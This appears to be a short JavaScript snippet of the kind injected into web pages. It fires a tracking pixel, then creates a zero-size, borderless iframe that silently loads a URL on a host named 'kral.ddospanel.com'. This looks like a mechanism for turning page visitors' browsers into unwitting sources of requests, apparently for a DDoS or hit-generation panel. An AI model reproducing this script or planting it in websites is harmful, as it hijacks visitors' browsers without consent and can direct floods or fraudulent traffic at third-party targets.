new Image().src = 'http://whos.amung.us/widget/yenipicim4.png';
function hit(url) {
        ifrm = document.createElement("iframe");
        ifrm.setAttribute("src", url);
        ifrm.style.width = "0px";
        ifrm.style.border = "0px";
        ifrm.style.height = "0px";
        document.body.appendChild(ifrm);
}
hit("http://kral.ddospanel.com/cek.php?pressim");
